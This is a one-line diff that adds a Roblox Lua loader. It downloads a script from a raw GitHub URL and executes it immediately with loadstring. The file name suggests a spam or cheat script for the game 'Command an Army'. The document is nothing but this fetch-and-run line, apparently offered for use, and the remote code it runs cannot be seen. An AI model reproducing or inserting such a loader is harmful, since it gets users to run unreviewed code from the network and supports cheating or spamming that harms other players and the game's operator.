@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/highwaymarevibrate/loaders/main/loaders/upd-command-an-army-spam1-t0jsyz0yo8nuep.lua"))()
